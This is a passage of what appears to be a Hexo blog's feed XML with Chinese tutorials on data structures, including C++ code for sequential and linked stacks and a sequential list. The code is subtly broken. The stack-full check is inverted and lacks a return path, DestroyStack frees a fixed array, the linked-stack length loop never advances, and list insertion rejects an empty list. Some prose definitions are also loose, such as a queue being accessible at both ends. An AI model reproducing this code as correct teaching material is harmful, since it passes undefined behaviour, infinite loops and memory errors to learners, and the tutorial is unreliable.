title="队列"></a>队列</h2><p>队列是类似栈的数据结构。</p><p>队列的特点是：</p><ul><li>元素可以通过两端进行访问</li><li>先进先出（最先进入的元素，最先取出</li></ul><h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>哈希表是根据键值对直接进行访问的数据结构。</p><p>哈希表的特点是：</p><ul><li>查找数据，速度很快</li><li>无法做范围查找</li></ul><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是一种图的树形结构。</p><p>堆的特点是：</p><ul><li>每个结点最多有两个子结点</li><li>子结点必须大于父结点</li><li>堆中最顶端的数据始终最小，无论数据量有多少，取出最小值的时间复杂度都为O(1)</li><li>取出数据，需要将最后的数据移动到最顶端，一边与子结点比较大小，一边往下移动，复杂度为O(logn)</li><li>添加数据，一边与父结点比较大小，一边往上移动，复杂度为O(logn)</li></ul><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><p>二叉查找树（又叫二叉搜索树或二叉排序树）是一种图形的数据结构。</p><p>二叉查找树的特点是：</p><ul><li>每个结点最多有两个子结点</li><li>每个结点的值均大于左子树上任意一个结点的值</li><li>每个结点的值均小于右子树上任意一个结点的值</li></ul><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><p>图是由结点的有穷集合V和边的集合E组成，图的数据结构比较复杂，在存储数据上有着比较复杂和高效的算法，分别有邻接矩阵 、邻接表、十字链表、邻接多重表、边集数组等存储结构。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构（三）栈</title>
      <link href="/data-structure-3-stack/"/>
      <url>/data-structure-3-stack/</url>
      
        <content type="html"><![CDATA[<h2 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h2><p>栈是一种只能从表的一端存取数据且遵循 “后进先出 LIFO（Last In First Out）” 原则的线性存储结构。</p><a id="more"></a><p><img src="http://c.biancheng.net/uploads/allimg/190426/1I0526392-0.gif" alt=""></p><p>通常，栈的开口端被称为栈顶，允许进行插入和删除；相应地，封口端被称为栈底，不允许进行插入和删除。</p><p><img src="http://c.biancheng.net/uploads/allimg/190426/1I0523601-1.gif" alt=""></p><p>基于栈结构的特点，在实际应用中，通常只会对栈执行以下两种操作：</p><ul><li>向栈中添加元素，此过程被称为”进栈”（入栈或压栈）；</li><li>从栈中提取出指定元素，此过程被称为”出栈”（或弹栈）；</li></ul><p>栈的基本操作：</p><ul><li><code>void InitStack(SqStack &amp;S);</code>         // 初始化一个空栈</li><li><code>bool StackEmpty(SqStack S);</code>         // 判断一个栈是否为空， 若找 s 为空则返回 true，否则返回 false。</li><li><code>bool Push(SqStack &amp;S, ElemType x);</code>  // 进栈，若栈 s 未满，则将 x 压入栈</li><li><code>bool Pop(SqStack &amp;s, ElemType &amp;x);</code>  // 出栈，若栈 S 非空，则弹出栈顶元素， 并用 x 返回。</li><li><code>bool GetTop(SqStack S, ElemType &amp;x);</code>// 读栈顶元素，若栈 s 非空，则用 x 返回栈顶元素。</li><li><code>void DestroyStack(SqStack&amp;S);</code>       // 销毁栈，并释放栈 s 占用的存储空间。</li><li><code>bool StackOverflow(SqStack S);</code>      // 判断栈是否满</li><li><code>int StackLength(SqStack S);</code>         // 栈元素个数</li></ul><h2 id="栈的顺序存储"><a href="#栈的顺序存储" class="headerlink" title="栈的顺序存储"></a>栈的顺序存储</h2><p>采用顺序存储结构可以模拟栈存储数据的特点，从而实现栈存储结构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxSize 100                 <span class="comment">// 定义栈中元素的最大个数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 栈的顺序存储</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;               <span class="comment">// 元素数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SqStack</span> &#123;</span></span><br><span class="line">    ElemType data[MaxSize];         <span class="comment">// 存放栈中元素</span></span><br><span class="line">    <span class="keyword">int</span> top;                        <span class="comment">// 栈顶指针</span></span><br><span class="line">&#125; SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 将栈顶赋值为 -1</span></span><br><span class="line">    S.top = <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断栈是否为空</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S.top == <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S, ElemType x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (StackOverflow(S)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  先给S.top +1，然后给 S.data[S.top +1] 赋值</span></span><br><span class="line">    S.data[++S.top] = x;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 出栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S, ElemType &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断栈空</span></span><br><span class="line">    <span class="keyword">if</span> (StackEmpty(S)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先把S.data[S.top] 的值赋值给 x，然后 S.top -1</span></span><br><span class="line">    x = S.data[S.top--];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取栈顶元素</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetTop</span><span class="params">(SqStack S, ElemType &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断栈空</span></span><br><span class="line">    <span class="keyword">if</span> (StackEmpty(S)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x = S.data[S.top];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 销毁栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.top = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 释放栈 S 所占存储空间</span></span><br><span class="line">    <span class="built_in">free</span>(S.data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断桟满</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StackOverflow</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top &gt;= MaxSize<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取栈的元素个数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param S</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> S.top+<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="栈的链式存储"><a href="#栈的链式存储" class="headerlink" title="栈的链式存储"></a>栈的链式存储</h2><p>采用链式存储结构实现栈结构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 栈的链式存储</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> &#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    LinkNode * next;</span><br><span class="line">&#125;LinkNode, *LiStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param LS</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">LiStack <span class="title">InitLiStack</span><span class="params">(LiStack &amp;LS)</span></span>&#123;</span><br><span class="line">    LS = (LiStack) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    LS-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> LS;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断栈是否为空</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param LS</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">LiStackEmpty</span><span class="params">(LiStack LS)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> LS-&gt;next == <span class="literal">NULL</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param LS</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LiPush</span><span class="params">(LiStack &amp;LS, ElemType x)</span></span>&#123;</span><br><span class="line">    LiStack Lhead = (LiStack) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    Lhead-&gt;data = x;</span><br><span class="line">    Lhead-&gt;next = LS-&gt;next;</span><br><span class="line">    LS-&gt;next = Lhead;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 出栈</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param LS</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">ElemType <span class="title">LiPop</span><span class="params">(LiStack &amp;LS)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (LiStackEmpty(LS)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ElemType x;</span><br><span class="line">    LiStack Lhead = LS-&gt;next;</span><br><span class="line">    LS-&gt;next = Lhead-&gt;next;</span><br><span class="line">    x = Lhead-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(Lhead);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取栈的元素个数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param LS</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LiStackLength</span><span class="params">(LiStack LS)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (LS-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        i ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构（二）线性表</title>
      <link href="/data-structure-2-linear-table/"/>
      <url>/data-structure-2-linear-table/</url>
      
        <content type="html"><![CDATA[<h2 id="线性表的逻辑结构"><a href="#线性表的逻辑结构" class="headerlink" title="线性表的逻辑结构"></a>线性表的逻辑结构</h2><p>定义：由 N（N &gt;= 0）个<strong>相同类型</strong>的元素组成的<strong>有序</strong>集合。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L &#x3D; (a1, a2, , ai-1, ai, ai+1, , an);</span><br></pre></td></tr></table></figure><p>数组是一种线性表，但是不能说线性表就是数组。<br>线性表可以用数组实现（顺序表），也可以用链表实现（单链表、双链表）。</p><ol><li>线性表中元素个数 n，称为线性表的长度。当 <code>n=0</code> 时，为空表。</li><li>a1 是唯一一个 <strong>第一个</strong> 数据元素，an 是唯一的 <strong>最后一个</strong> 数据元素。</li><li>ai-1 是 ai 的直接前驱，ai+1 为 ai 的直接后继。</li></ol><p>线性表的特点：</p><ol><li>表中元素是有限的</li><li>表中元素的数据类型都是相同的，意味着每一个元素占用相同大小的空间</li><li>表中元素具有逻辑上的顺序性，在序列中各元素排序有其先后顺序</li></ol><h2 id="线性表的顺序存储"><a href="#线性表的顺序存储" class="headerlink" title="线性表的顺序存储"></a>线性表的顺序存储</h2><p>使用顺序储存实现线性表的优点：</p><ol><li>可以随机存取（根据表头任意元素地址和元素序号）表中任意一个元素</li><li>存储密度高，每个结点只存储数据元素</li></ol><p>缺点：</p><ol><li>插入和删除时都需要移动大量元素</li><li>线性表变化较大时，难以确定存储空间的容量</li><li>存储分配需要一段连续的存储空间，不够灵活</li></ol><p>线性表基本操作主要有：</p><ul><li><code>bool InitList(SqList &amp;L)</code>：初始化表。构造一个空的线性表。</li><li><code>int LocateElem(SqList L, ElemType e)</code>：按值查找操作。在表 L 中查找具有给定关键宇值的元素。</li><li><code>ElemType GetElem(SqList L, int i)</code>：按位查找操作。获取表 L 中第 i 个位置的元素的值。</li><li><code>bool ListInsert(SqList &amp;L, int i, ElemType e)</code>：插入操作。在表 L 中的第 i 个位置上插入指定元素 e。</li><li><code>bool ListDelete(SqList &amp;L, int i, ElemType &amp;e)</code>：删除操作。删除表 L 中第 i 个位置的元素，并用 e 返回删除元素的值。</li><li><code>int Length(SqList L)</code>：返回线性表 L 的长度，即 L 中数据元素的个数。</li><li><code>bool Empty(SqList L)</code>：判空操作。若 L 为空表， 则返回 true，否则返回 false。</li><li><code>bool DestroyList(SqList &amp;L)</code>：销毁操作。销毁线性表，井释放线性表 L 所占用的内存空间。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"SqList.hpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化。构造一个空的线性表。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    L.data = (ElemType *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (ElemType) * MaxSize);</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 插入操作，在表 L ，第 i 个位置插入指定元素 e</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param i</span></span><br><span class="line"><span class="comment"> * @param e</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListInsert</span><span class="params">(SqList &amp;L, <span class="keyword">int</span> i, ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 判断 i 的取值范围是否有效（ 1&lt;=i&lt;=L.length)</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当存储空间已满，不能插入</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt;= MaxSize) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = L.length; j &gt;= i; j--) &#123;</span><br><span class="line">        L.data[j] = L.data[j<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    L.data[i<span class="number">-1</span>] = e;</span><br><span class="line">    L.length ++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除操作，删除线性表 L 第 i 个位置的元素，并用 e 返回被删除元素的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param i</span></span><br><span class="line"><span class="comment"> * @param e</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListDelete</span><span class="params">(SqList &amp;L, <span class="keyword">int</span> i, ElemType &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// i 的值必须合法</span></span><br><span class="line">    <span class="keyword">if</span> (Empty(L)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断 i 的取值范围是否有效（ 1&lt;=i&lt;=L.length)</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要被删除元素的值</span></span><br><span class="line">    e = L.data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="comment">// 将剩余的元素的值往前移动</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; L.length; j++) &#123;</span><br><span class="line">        L.data[j<span class="number">-1</span>] = L.data[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回线性表的长度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Length</span><span class="params">(SqList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 